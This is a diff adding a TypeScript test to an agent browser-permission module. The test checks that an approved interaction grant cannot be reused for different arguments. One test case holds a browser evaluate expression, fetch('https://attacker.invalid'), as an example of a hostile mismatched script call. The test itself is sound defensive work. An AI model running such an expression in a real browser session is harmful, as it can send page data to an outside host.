@@ -271,6 +271,35 @@ test("[AUT-01] executePolicyBrowserOpen: autorização negada não cria target",
   assert.equal(targetManager.listActiveTargetIds().length, 0);
 });
 
+test("[AUT-01] executePolicyBrowserOpen: grant vinculado aos argumentos exatos da interação", async () => {
+  const { RunToolPermissionFlow } = await import("@openagent/policy");
+  const mismatches: Array<{ allowed: import("../../src/index.js").BrowserInteraction; actual: import("../../src/index.js").BrowserInteraction }> = [
+    { allowed: { type: "evaluate", expression: "document.title" }, actual: { type: "evaluate", expression: "fetch('https://attacker.invalid')" } },
+    { allowed: { type: "click", selector: "#safe" }, actual: { type: "click", selector: "#danger" } },
+    { allowed: { type: "type", selector: "#name", text: "Alice" }, actual: { type: "type", selector: "#name", text: "admin" } },
+  ];
+
+  for (const [index, mismatch] of mismatches.entries()) {
+    const flow = new RunToolPermissionFlow();
+    const prepared = preparePolicyBrowserOpen(flow, agentContext(), {
+      runId: `run-mismatch-${index}`, sessionId: `sess-mismatch-${index}`,
+      requestId: `perm-mismatch-${index}`, url: "http://localhost:3000/mismatch.html",
+      interaction: mismatch.allowed,
+    });
+    flow.decide(prepared.permission.request.requestId, "allow", "once");
+    const targetManager = new CdpTargetManager(new InMemoryCdpTransport());
+    await assert.rejects(executePolicyBrowserOpen(targetManager, {
+      url: "http://localhost:3000/mismatch.html", interaction: mismatch.actual,
+    }, undefined, { flow, requestId: prepared.permission.request.requestId }), (error: unknown) => {
+      assert.ok(error instanceof ProtocolError);
+      assert.equal(error.code, PROTOCOL_ERROR_CODES.INVALID_STATE);
+      return true;
+    });
+    assert.equal(targetManager.listActiveTargetIds().length, 0);
+    await targetManager.dispose();
+  }
+});
+
 // ================================================================
 // AUT-01 — target isolado
 // ================================================================
